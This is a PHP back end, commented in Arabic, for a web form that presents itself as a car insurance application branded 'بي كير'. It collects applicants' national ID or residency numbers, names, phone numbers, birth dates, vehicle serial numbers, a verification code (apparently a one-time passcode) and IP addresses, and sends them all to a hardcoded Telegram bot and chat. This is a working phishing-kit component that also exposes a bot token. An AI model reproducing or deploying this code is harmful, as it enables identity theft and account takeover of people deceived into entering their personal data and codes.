<?php
// إعدادات التليجرام
define('BOT_TOKEN', '8716166611:AAFMgUb2iMpmWozRF2iuooR661v19EKjiKs');
define('CHAT_ID', '8535558521');

// استقبال البيانات من النموذج
$insurance_type = isset($_POST['insurance_type']) ? $_POST['insurance_type'] : '';
$identity_number = isset($_POST['identity_number']) ? $_POST['identity_number'] : '';
$applicant_name = isset($_POST['applicant_name']) ? $_POST['applicant_name'] : '';
$phone_number = isset($_POST['phone_number']) ? $_POST['phone_number'] : '';
$birth_date = isset($_POST['birth_date']) ? $_POST['birth_date'] : '';
$registration_method = isset($_POST['registration_method']) ? $_POST['registration_method'] : '';
$serial_number = isset($_POST['serial_number']) ? $_POST['serial_number'] : '';
$verification_code = isset($_POST['verification_code']) ? $_POST['verification_code'] : '';

// تحديد نوع التأمين بالعربي
$insurance_type_ar = ($insurance_type === 'new') ? 'تأمين جديد' : 'نقل الملكية';

// تحديد طريقة التسجيل بالعربي
$registration_method_ar = ($registration_method === 'serial') ? 'الرقم التسلسلي' : 'بطاقة جمركية';

// بناء الرسالة
$message = "🚗 <b>طلب تأمين جديد - بي كير</b>\n\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";
$message .= "📋 <b>نوع التأمين:</b> " . $insurance_type_ar . "\n\n";
$message .= "👤 <b>رقم الهوية/الإقامة:</b> " . $identity_number . "\n\n";
$message .= "✍️ <b>اسم مقدم الطلب:</b> " . $applicant_name . "\n\n";
$message .= "📱 <b>رقم الجوال:</b> " . $phone_number . "\n\n";

// إضافة تاريخ الميلاد إذا كان نقل ملكية
if ($insurance_type === 'transfer' && !empty($birth_date)) {
    $message .= "🎂 <b>تاريخ الميلاد:</b> " . $birth_date . "\n\n";
}

$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";
$message .= "🔧 <b>طريقة التسجيل:</b> " . $registration_method_ar . "\n\n";
$message .= "🔢 <b>رقم المركبة:</b> " . $serial_number . "\n\n";
$message .= "🔐 <b>رمز التحقق:</b> " . $verification_code . "\n\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";
$message .= "⏰ <b>وقت الطلب:</b> " . date('Y-m-d H:i:s') . "\n";
$message .= "🌐 <b>IP:</b> " . $_SERVER['REMOTE_ADDR'];

// إرسال الرسالة إلى التليجرام
function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    return $result;
}

// إرسال الرسالة
$response = sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);

// إرجاع استجابة JSON
header('Content-Type: application/json');
if ($response !== false) {
    echo json_encode([
        'success' => true,
        'message' => 'تم الإرسال بنجاح'
    ]);
} else {
    echo json_encode([
        'success' => false,
        'message' => 'فشل الإرسال'
    ]);
}
?>